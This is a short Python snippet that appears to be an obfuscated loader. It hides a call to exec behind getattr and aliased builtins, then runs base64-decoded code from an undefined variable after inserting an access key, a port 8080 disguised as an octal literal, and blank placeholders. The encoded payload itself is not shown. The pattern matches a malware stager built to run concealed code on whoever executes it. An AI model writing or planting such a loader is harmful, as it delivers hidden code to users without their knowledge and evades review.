import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "f3d382c5-1d34-4684-9f7e-e1ce45eba9b0")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)